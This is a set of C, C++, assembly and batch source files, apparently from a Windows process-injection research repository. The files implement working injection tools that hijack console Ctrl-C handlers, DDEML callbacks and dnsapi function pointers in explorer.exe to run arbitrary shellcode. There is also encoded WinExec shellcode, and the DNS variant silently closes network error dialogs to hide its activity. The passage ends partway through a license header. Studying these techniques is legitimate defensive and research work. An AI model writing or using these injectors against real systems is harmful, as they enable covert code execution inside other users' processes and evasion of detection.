    if(last_ptr != NULL) {
      // backup existing encoded handler
      ReadProcessMemory(hp, last_ptr, 
        &enc_ptr, sizeof(ULONG_PTR), &rd);
      
      // allocate RWX memory in remote process
      cs = VirtualAllocEx(
        hp, 
        NULL, 
        payloadSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE);
        
      if(cs != NULL) {
        // write payload
        WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
        
        // encode pointer to payload
        RtlEncodeRemotePointer(hp, cs, (PVOID*)&Handler);
        
        // overwrite pointer in HandlerList for remote process
        WriteProcessMemory(hp, last_ptr, 
          &Handler, sizeof(PHANDLER_ROUTINE), &wr);
          
        // execute
        SendCtrlC(hw);

        // restore original function
        WriteProcessMemory(hp, last_ptr, 
          &enc_ptr, sizeof(PHANDLER_ROUTINE), &wr); 

        VirtualFreeEx(hp, cs, 0,  MEM_RELEASE);
      }
    }
    CloseHandle(hp);
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    WCHAR cls[MAX_PATH];
    
    GetClassName(hwnd, cls, MAX_PATH);
    printf("%p : %ws\n", (LPVOID)hwnd, cls);
    return TRUE;
}

BOOL CALLBACK EnumThreadWndProc(HWND hwnd, LPARAM lParam) {
    WCHAR cls[MAX_PATH];
    
    GetClassName(hwnd, cls, MAX_PATH);
    printf("%p : %ws\n", (LPVOID)hwnd, cls);
    
    EnumChildWindows(hwnd, EnumChildProc, lParam);
    return TRUE;
}

VOID EnumProcessWindows(DWORD pid) {
    DWORD         i, cnt = 0;
    HANDLE        ss;
    THREADENTRY32 te;

    // create snapshot of system
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if(ss == INVALID_HANDLE_VALUE) return;
    
    // gather list of threads
    te.dwSize = sizeof(THREADENTRY32);
    
    if(Thread32First(ss, &te)) {
      do {
        // if not our target process, skip it
        if(pid != 0 && te.th32OwnerProcessID != pid) continue;
        
        EnumThreadWindows(te.th32ThreadID, EnumThreadWndProc, 0);
      } while(Thread32Next(ss, &te));
    }
    CloseHandle(ss);
}

VOID ListConsoles(VOID) {
    DWORD  i, cnt = 0;
    PDWORD list;
    
    cnt = GetConsoleProcessList(&cnt, 1);
    
    list = (PDWORD)malloc(cnt * sizeof(DWORD));
    if(list != NULL) {
      GetConsoleProcessList(list, cnt);
      
      for(i=0; i<cnt; i++) {
        printf("%ws : %i\n", pid2name(list[i]), list[i]);
      }
      free(list);
    }
}

int wmain(int argc, WCHAR *argv[]) {
    DWORD  pid = 0;
    SIZE_T len;
    LPVOID pic;
    
    ListConsoles();
    
    SetPrivilege(SE_DEBUG_NAME, TRUE);
    SymSetOptions(SYMOPT_DEFERRED_LOADS);
    
    if(argc < 2) {
      printf("\nusage: ctrl_inject <process> <payload.bin>\n");
      return 0;
    }

    pid = name2pid(argv[1]);
    
    if(pid == 0) pid = wcstoull(argv[1], NULL, 10);
    if(pid == 0) { 
      printf("unable to obtain process id for %ws\n", argv[1]);
      return 0;
    }
    
    if(argc == 3) {
      len = readpic(argv[2], &pic);
      if (len == 0) { printf("\ninvalid payload\n"); return 0;}
      ctrl_inject(pid, pic, len);
    } else {
      ctrl_list(pid);
    }
    return 0;
}


```

`dde/dde.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "../ntlib/util.h"

typedef struct tagLINK_COUNT *PLINK_COUNT;
typedef ATOM LATOM;

typedef struct tagSERVER_LOOKUP {
    LATOM           laService;
    LATOM           laTopic;
    HWND            hwndServer;
} SERVER_LOOKUP, *PSERVER_LOOKUP;

typedef struct tagCL_INSTANCE_INFO {
    struct tagCL_INSTANCE_INFO *next;
    HANDLE                      hInstServer;
    HANDLE                      hInstClient;
    DWORD                       MonitorFlags;
    HWND                        hwndMother;
    HWND                        hwndEvent;
    HWND                        hwndTimeout;
    DWORD                       afCmd;
    PFNCALLBACK                 pfnCallback;
    DWORD                       LastError;
    DWORD                       tid;
    LATOM                      *plaNameService;
    WORD                        cNameServiceAlloc;
    PSERVER_LOOKUP              aServerLookup;
    short                       cServerLookupAlloc;
    WORD                        ConvStartupState;
    WORD                        flags;              // IIF_ flags
    short                       cInDDEMLCallback;
    PLINK_COUNT                 pLinkCount;
} CL_INSTANCE_INFO, *PCL_INSTANCE_INFO;

#define GWLP_INSTANCE_INFO 0 // PCL_INSTANCE_INFO

VOID dde_inject(LPVOID payload, DWORD payloadSize) {
    HWND             hw;
    SIZE_T           rd, wr;
    LPVOID           ptr, cs;
    HANDLE           hp;
    CL_INSTANCE_INFO pcii;
    CONVCONTEXT      cc;
    HCONVLIST        cl;
    DWORD            pid, idInst = 0;
    
    // 1. find a DDEML window and read the address 
    //    of CL_INSTANCE_INFO
    hw = FindWindowEx(NULL, NULL, L"DDEMLMom", NULL);
    if(hw == NULL) return;
    ptr = (LPVOID)GetWindowLongPtr(hw, GWLP_INSTANCE_INFO);
    if(ptr == NULL) return;
      
    // 2. open the process and read CL_INSTANCE_INFO
    GetWindowThreadProcessId(hw, &pid);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hp == NULL) return;
    ReadProcessMemory(hp, ptr, &pcii, sizeof(pcii), &rd);
    
    // 3. allocate RWX memory and write payload there.
    //    update callback
    cs = VirtualAllocEx(hp, NULL, payloadSize, 
      MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
    WriteProcessMemory(
      hp, (PBYTE)ptr + offsetof(CL_INSTANCE_INFO, pfnCallback), 
      &cs, sizeof(ULONG_PTR), &wr);
            
    // 4. trigger execution via DDE protocol
    DdeInitialize(&idInst, NULL, APPCLASS_STANDARD, 0);
    ZeroMemory(&cc, sizeof(cc));
    cc.cb = sizeof(cc);
    cl = DdeConnectList(idInst, 0, 0, 0, &cc);
    DdeDisconnectList(cl);
    DdeUninitialize(idInst);
    
    // 5. restore original pointer and cleanup
    WriteProcessMemory(
      hp, 
      (PBYTE)ptr + offsetof(CL_INSTANCE_INFO, pfnCallback), 
      &pcii.pfnCallback, sizeof(ULONG_PTR), &wr);
          
    VirtualFreeEx(hp, cs, 0,  MEM_RELEASE);
    CloseHandle(hp);
}

VOID dde_list(VOID) {
    CONVCONTEXT cc;
    HCONVLIST   cl;
    DWORD       idInst = 0;
    HCONV       c = NULL;
    CONVINFO    ci;
    WCHAR       server[MAX_PATH];
    
    if(DMLERR_NO_ERROR != DdeInitialize(&idInst, NULL, APPCLASS_STANDARD, 0)) {
      printf("unable to initialize : %i.\n", GetLastError());
      return;
    }
    
    ZeroMemory(&cc, sizeof(cc));
    cc.cb = sizeof(cc);
    cl = DdeConnectList(idInst, 0, 0, 0, &cc);
    
    if(cl != NULL) {
      for(;;) {
        c = DdeQueryNextServer(cl, c);
        if(c == NULL) break;
        ci.cb = sizeof(ci);
        DdeQueryConvInfo(c, QID_SYNC, &ci);
        DdeQueryString(idInst, ci.hszSvcPartner, server, MAX_PATH, CP_WINUNICODE);
        
        printf("Service : %-10ws Process : %ws\n", 
          server, wnd2proc(ci.hwndPartner));
      }
      DdeDisconnectList(cl);
    } else {
      printf("DdeConnectList : %x\n", DdeGetLastError(idInst));
    }
    DdeUninitialize(idInst);
}

int main(void) {
    LPVOID  pic;
    DWORD   len;
    int     argc;
    wchar_t **argv;
    
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    
    if(argc != 2) {
      dde_list();
      printf("\n\nusage: dde_inject <payload>.\n");
      return 0;
    }

    len=readpic(argv[1], &pic);
    if (len==0) { printf("\ninvalid payload\n"); return 0;}
    
    dde_inject(pic, len);
    
    return 0;
}
```

`dns/dns.cpp`:

```cpp
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include "../ntlib/util.h"

HRESULT GetDesktopShellView(REFIID riid, void **ppv) {
    HWND           hwnd;
    IDispatch      *pdisp;
    IShellWindows  *psw;
    VARIANT        vEmpty = {};
    IShellBrowser  *psb;
    IShellView     *psv;
    HRESULT        hr;
    
    *ppv = NULL;
        
    hr = CoCreateInstance(CLSID_ShellWindows, 
      NULL, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&psw));
      
    if(hr == S_OK) {
      hr = psw->FindWindowSW(
        &vEmpty, &vEmpty, 
        SWC_DESKTOP, (long*)&hwnd, 
        SWFO_NEEDDISPATCH, &pdisp);
        
      if(hr == S_OK) {
        hr = IUnknown_QueryService(
          pdisp, SID_STopLevelBrowser, IID_PPV_ARGS(&psb));
        if(hr == S_OK) {
          hr = psb->QueryActiveShellView(&psv);
          if(hr == S_OK) {
            hr = psv->QueryInterface(riid, ppv);
            psv->Release();
          }
          psb->Release();
        }
        pdisp->Release();
      }
      psw->Release();
    }
    return hr;
}

HRESULT GetShellDispatch(
  IShellView *psv, REFIID riid, void **ppv) 
{
    IShellFolderViewDual *psfvd;
    IDispatch            *pdispBackground, *pdisp;;
    HRESULT              hr;
    
    *ppv = NULL;
    hr = psv->GetItemObject(
      SVGIO_BACKGROUND, IID_PPV_ARGS(&pdispBackground));
    
    if(hr == S_OK) {
      hr = pdispBackground->QueryInterface(IID_PPV_ARGS(&psfvd));
      if(hr == S_OK) {
        hr = psfvd->get_Application(&pdisp);
        if(hr == S_OK) {
          hr = pdisp->QueryInterface(riid, ppv);
          pdisp->Release();
        }
        psfvd->Release();
      }
      pdispBackground->Release();
    }
    return hr;
}

HRESULT ShellExecInExplorer(PCWSTR pszFile) {
    IShellView      *psv;
    IShellDispatch2 *psd;
    HRESULT         hr;
    BSTR            bstrFile;
    VARIANT         vtHide, vtEmpty = {};
    
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    
    bstrFile = SysAllocString(pszFile);
    if(bstrFile == NULL) return E_OUTOFMEMORY;
    
    hr = GetDesktopShellView(IID_PPV_ARGS(&psv));
    if(hr == S_OK) {
      hr = GetShellDispatch(psv, IID_PPV_ARGS(&psd));
      if(hr == S_OK) {
        V_VT(&vtHide)  = VT_INT;
        V_INT(&vtHide) = SW_HIDE;
        hr = psd->ShellExecuteW(
          bstrFile, vtEmpty, vtEmpty, vtEmpty, vtEmpty);
        psd->Release();
      }
      psv->Release();
    }
    SysFreeString(bstrFile);
    return hr;
}

LPVOID GetDnsApiAddr(DWORD pid) {
    LPVOID                m, rm, va = NULL;
    PIMAGE_DOS_HEADER     dos;
    PIMAGE_NT_HEADERS     nt;
    PIMAGE_SECTION_HEADER sh;
    DWORD                 i, cnt, rva=0;
    PULONG_PTR            ds;
    
    // does remote have dnsapi loaded?
    rm  = GetRemoteModuleHandle(pid, L"dnsapi.dll");
    if(rm == NULL) return NULL;
    
    // load local copy
    m   = LoadLibrary(L"dnsapi.dll");
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
          nt->FileHeader.SizeOfOptionalHeader);
          
    // locate the .data segment, save VA and number of pointers
    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(*(PDWORD)sh[i].Name == *(PDWORD)".data") {
        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
        break;
      }
    }
    // for each pointer
    for(i=0; i<cnt - 1; i++) {
      // if two pointers side by side are not to code, skip it
      if(!IsCodePtr((LPVOID)ds[i  ])) continue;
      if(!IsCodePtr((LPVOID)ds[i+1])) continue;
      // calculate VA in remote process
      va = ((PBYTE)&ds[i] - (PBYTE)m) + (PBYTE)rm;
      break;
    }
    return va;
}

// for any "Network Error", close the window
VOID SuppressErrors(LPVOID lpParameter) {
    HWND hw;
    
    for(;;) {
      hw = FindWindowEx(NULL, NULL, NULL, L"Network Error");
      if(hw != NULL) {
        PostMessage(hw, WM_CLOSE, 0, 0);
      }
    }
}

VOID dns_inject(LPVOID payload, DWORD payloadSize) {
    LPVOID dns, cs, ptr;
    DWORD  pid, cnt, tick, i, t;
    HANDLE hp, ht;
    SIZE_T wr;
    HWND   hw;
    WCHAR  unc[32]={L'\\', L'\\'}; // UNC path to invoke DNS api

    // 1. obtain process id for explorer
    //    and try read address of function pointers
    GetWindowThreadProcessId(GetShellWindow(), &pid); 
    ptr = GetDnsApiAddr(pid);
    
    // 2. create a thread to suppress network errors displayed
    ht = CreateThread(NULL, 0, 
      (LPTHREAD_START_ROUTINE)SuppressErrors, NULL, 0, NULL);
      
    // 3. if dns api not already loaded, try force 
    // explorer to load via fake UNC path
    if(ptr == NULL) {
      tick = GetTickCount();
      for(i=0; i<8; i++) {
        unc[2+i] = (tick % 26) + 'a';
        tick >>= 2;
      }
      ShellExecInExplorer(unc);
      ptr = GetDnsApiAddr(pid);
    }
    
    if(ptr != NULL) {
      // 4. open explorer, backup address of dns function.
      //    allocate RWX memory and write payload
      hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
      ReadProcessMemory(hp, ptr, &dns, sizeof(ULONG_PTR), &wr);
      cs = VirtualAllocEx(hp, NULL, payloadSize, 
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
      
      // 5. overwrite pointer to dns function
      //    generate fake UNC path and trigger execution
      WriteProcessMemory(hp, ptr, &cs, sizeof(ULONG_PTR), &wr);
      tick = GetTickCount();
      for(i=0; i<8; i++) {
        unc[2+i] = (tick % 26) + L'a';
        tick >>= 2;
      }
      ShellExecInExplorer(unc);
      
      // 6. restore dns function, release memory and close process
      WriteProcessMemory(hp, ptr, &dns, sizeof(ULONG_PTR), &wr);
      VirtualFreeEx(hp, cs, 0,  MEM_RELEASE);
      CloseHandle(hp);
    }
    // 7. terminate thread
    TerminateThread(ht, 0);
}

int main(void) {
    LPVOID  pic;
    DWORD   len;
    int     argc;
    wchar_t **argv;
    
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    
    if(argc != 2) {
      printf("\nusage: dnsinject <payload.bin>\n");
      return 0;
    }

    len=readpic(argv[1], &pic);
    if (len==0) { printf("\ninvalid payload\n"); return 0;}
    
    dns_inject(pic, len);
    
    return 0;
}

```

`eminject/bld.bat`:

```bat
@echo off
yasm -fbin -DBIN calc3.asm -ocalc3.bin
disasm -m64 calc3.bin >calc3.h
yasm -fbin -DBIN calc4.asm -ocalc4.bin
disasm -m64 calc4.bin >calc4.h
yasm -fwin64 calc3.asm -ocalc3.obj
cl /c demo.c
link /LARGEADDRESSAWARE:NO demo.obj calc3.obj
```

`eminject/calc3.asm`:

```asm
    bits 32
    
    %ifndef BIN
      global calc
    %endif
    
    ; <prolog code>
    ; <load address of code after call to LoadLibrary or WinExec>
    ; <load address of string passed to API>
    ; <load address of API>
    ; <Setup homespace and call API>
    ; <Remove homespace>
    ; <epilog code>
    ; push_reg macro
    ; pop_reg macro
    ; set_reg macro
    ;
calc:
    ; ************************* prolog
    mov    al, 0
    enter  256, 0
    
    ; save ebp
    push   ebp
    add    [ebp], al
    
    ; create local variable for rbp
    push   0
    push   esp
    add    [ebp], al
    
    pop    ebp
    add    [ebp], cl
    
    ; save edi
    push   edi      ;    +
    add    [ebp], cl
    
    ; save esi
    push   esi     ;     -
    add    [ebp], cl
    
    ; save ebx
    push   ebx
    add    [ebp], cl
    
    ; ********************** load address to return to after WinExec/LoadLibraryW
    ; remember, we can't use a CALL or JMP, just RET
    
    ; load address of ret_addr onto the stack
    mov    eax, 0xFF004d00
    add    cl, ah
    add    [ebp], cl
    
    mov    eax, 0xFF000100
    add    ch, ah
    add    [ebp], cl
    
    push   ecx
    add    [ebp], cl
    
    pop    ebx
    add    [ebp], cl
    
    ; ********************* load a string onto the stack
    ; instead of loading a string, load an address of the buffer that contains command to execute
    ; write \x63 \x61 \x6c \x63 \x00 or "calc\0" to local buffer
    push   0
    push   esp
    add    [ebp], cl
    
    pop    edi
    add    [ebp], cl

    push   edi
    add    [ebp], cl

    pop    ecx
    add    [ebp], cl
    
    ; store 'calc'
    push   0
    push   esp
    add    [ebp], cl
    
    pop    eax
    add    [ebp], cl
    
    mov    dword[eax], ((0x00 << 24) | ('l' << 16) | (0x00 << 8) | 'c')
    pop    eax
    add    [ebp], cl
    
    xor    eax, (('c' << 24) | (0x00 << 16) | ('a' << 8) | 0x00)
    add    [ebp], cl
    
    stosd
    add    [ebp], cl
    
    ; ********************** for WinExec, set the parameters
    ; set rdx = SW_SHOW (5)
    push   0
    push   esp
    add    [ebp], cl
    
    pop    eax
    add    [ebp], cl
    
    mov    byte[eax], 5
    add    [ebp], cl
    
    pop    edx
    add    [ebp], cl
    
    push   ebx
    add    [ebp], cl
    
    ; *********************** setup homespace
    push   0
    push   0
    push   0
    push   0
    push   0
    
    ; save return address (obsolete)
    push   ebx
    add    [ebp], cl
    
    ; padding shouldn't be required
    ; pad out so the size is no less than 260 bytes
    nop
    add    [ebp], cl
    
    nop
    add    [ebp], cl
    
    nop
    add    [ebp], cl
    
    nop
    add    [ebp], cl
ret_addr:
```

`eminject/calc3.h`:

```h

// Target architecture : X86 64

#define CALC3_SIZE 164

char CALC3[] = {
  /* 0000 */ "\xb0\x00"                 /* mov   al, 0                     */
  /* 0002 */ "\xc8\x00\x01\x00"         /* enter 0x100, 0                  */
  /* 0006 */ "\x55"                     /* push  rbp                       */
  /* 0007 */ "\x00\x45\x00"             /* add   byte [rbp], al        */
  /* 000A */ "\x6a\x00"                 /* push  0                         */
  /* 000C */ "\x54"                     /* push  rsp                       */
  /* 000D */ "\x00\x45\x00"             /* add   byte [rbp], al        */
  /* 0010 */ "\x5d"                     /* pop   rbp                       */
  /* 0011 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0014 */ "\x57"                     /* push  rdi                       */
  /* 0015 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0018 */ "\x56"                     /* push  rsi                       */
  /* 0019 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 001C */ "\x53"                     /* push  rbx                       */
  /* 001D */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0020 */ "\xb8\x00\x4d\x00\xff"     /* mov   eax, 0xff004d00           */
  /* 0025 */ "\x00\xe1"                 /* add   cl, ah                    */
  /* 0027 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 002A */ "\xb8\x00\x01\x00\xff"     /* mov   eax, 0xff000100           */
  /* 002F */ "\x00\xe5"                 /* add   ch, ah                    */
  /* 0031 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0034 */ "\x51"                     /* push  rcx                       */
  /* 0035 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0038 */ "\x5b"                     /* pop   rbx                       */
  /* 0039 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 003C */ "\x6a\x00"                 /* push  0                         */
  /* 003E */ "\x54"                     /* push  rsp                       */
  /* 003F */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0042 */ "\x5f"                     /* pop   rdi                       */
  /* 0043 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0046 */ "\x57"                     /* push  rdi                       */
  /* 0047 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 004A */ "\x59"                     /* pop   rcx                       */
  /* 004B */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 004E */ "\x6a\x00"                 /* push  0                         */
  /* 0050 */ "\x54"                     /* push  rsp                       */
  /* 0051 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0054 */ "\x58"                     /* pop   rax                       */
  /* 0055 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0058 */ "\xc7\x00\x63\x00\x6c\x00" /* mov   dword [rax], 0x6c0063 */
  /* 005E */ "\x58"                     /* pop   rax                   */
  /* 005F */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0062 */ "\x35\x00\x61\x00\x63"     /* xor   eax, 0x63006100       */
  /* 0067 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 006A */ "\xab"                     /* stosd                       */
  /* 006B */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 006E */ "\x6a\x00"                 /* push  0                     */
  /* 0070 */ "\x54"                     /* push  rsp                   */
  /* 0071 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0074 */ "\x58"                     /* pop   rax                   */
  /* 0075 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0078 */ "\xc6\x00\x05"             /* mov   byte [rax], 5         */
  /* 007B */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 007E */ "\x5a"                     /* pop   rdx                   */
  /* 007F */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0082 */ "\x53"                     /* push  rbx                   */
  /* 0083 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0086 */ "\x6a\x00"                 /* push  0                     */
  /* 0088 */ "\x6a\x00"                 /* push  0                     */
  /* 008A */ "\x6a\x00"                 /* push  0                     */
  /* 008C */ "\x6a\x00"                 /* push  0                     */
  /* 008E */ "\x6a\x00"                 /* push  0                     */
  /* 0090 */ "\x53"                     /* push  rbx                   */
  /* 0091 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0094 */ "\x90"                     /* nop                         */
  /* 0095 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 0098 */ "\x90"                     /* nop                         */
  /* 0099 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 009C */ "\x90"                     /* nop                         */
  /* 009D */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
  /* 00A0 */ "\x90"                     /* nop                         */
  /* 00A1 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
};

```

`eminject/calc4.asm`:

```asm
    
    
    bits 32
    
    ; remove homespace
    pop    ecx
    add    [ebp], cl

    pop    ecx
    add    [ebp], cl

    pop    ecx
    add    [ebp], cl

    pop    ecx
    add    [ebp], cl

    pop    ecx
    add    [ebp], cl
    
    ; load current address into ecx
    pop    ecx
    add    [ebp], cl
    
    ; add offset to ret_opcode
    mov    eax, 0xFF004d00
    add    cl, ah
    add    [ebp], cl
    
    ;mov    eax, 0xFF000100
    ;add    ch, ah
    ;add    [ebp], cl
    
    ; load offset into eax
    push   ecx
    add    [ebp], cl
    
    pop    eax
    add    [ebp], cl
    
    ; store RET opcode
    mov    byte[eax], 0xc3
    add    [ebp], cl
    
    ; remove 'calc\0'
    pop    ecx
    add    [ebp], cl
    
    ; ***************************** epilog
    ; restore ebx
    pop    ebx
    add    [ebp], cl
    
    ; restore esi
    pop    esi
    add    [ebp], cl
    
    ; restore edi
    pop    edi
    add    [ebp], cl
    
    ; remove var for ebp
    pop    ecx
    add    [ebp], cl
    
    ; return 0 
    push   0
    pop    eax
    add    [ebp], cl
    
    ; fixup the stack
    pop    esp
    add    [ebp], cl
    
    ; restore ebp
    pop    ebp
ret_opcode:
    ; return to caller
    
```

`eminject/calc4.h`:

```h

// Target architecture : X86 64

#define CALC4_SIZE 79

char CALC4[] = {
  /* 0000 */ "\x59"                 /* pop  rcx                  */
  /* 0001 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0004 */ "\x59"                 /* pop  rcx                  */
  /* 0005 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0008 */ "\x59"                 /* pop  rcx                  */
  /* 0009 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 000C */ "\x59"                 /* pop  rcx                  */
  /* 000D */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0010 */ "\x59"                 /* pop  rcx                  */
  /* 0011 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0014 */ "\x59"                 /* pop  rcx                  */
  /* 0015 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0018 */ "\xb8\x00\x4d\x00\xff" /* mov  eax, 0xff004d00      */
  /* 001D */ "\x00\xe1"             /* add  cl, ah               */
  /* 001F */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0022 */ "\x51"                 /* push rcx                  */
  /* 0023 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0026 */ "\x58"                 /* pop  rax                  */
  /* 0027 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 002A */ "\xc6\x00\xc3"         /* mov  byte ptr [rax], 0xc3 */
  /* 002D */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0030 */ "\x59"                 /* pop  rcx                  */
  /* 0031 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0034 */ "\x5b"                 /* pop  rbx                  */
  /* 0035 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0038 */ "\x5e"                 /* pop  rsi                  */
  /* 0039 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 003C */ "\x5f"                 /* pop  rdi                  */
  /* 003D */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0040 */ "\x59"                 /* pop  rcx                  */
  /* 0041 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 0044 */ "\x6a\x00"             /* push 0                    */
  /* 0046 */ "\x58"                 /* pop  rax                  */
  /* 0047 */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 004A */ "\x5c"                 /* pop  rsp                  */
  /* 004B */ "\x00\x4d\x00"         /* add  byte ptr [rbp], cl   */
  /* 004E */ "\x5d"                 /* pop  rbp                  */
};

```

`eminject/poc.c`:

```c
/**
  Copyright © 2020 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
